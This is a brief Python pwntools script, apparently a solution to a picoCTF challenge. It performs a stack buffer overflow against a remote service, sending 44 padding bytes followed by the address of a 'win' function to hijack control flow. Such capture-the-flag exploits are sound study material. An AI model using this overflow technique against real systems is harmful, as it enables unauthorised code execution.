from pwn import *

p = connect("saturn.picoctf.net", 53630)
#p.interactive()

e = ELF('./vuln')
addr = e.symbols['win']
#print(hex(addr))
#print(p64(addr))
b = b''
b += b'A'*44
b += p64(addr)
p.sendline(b)

p.interactive()
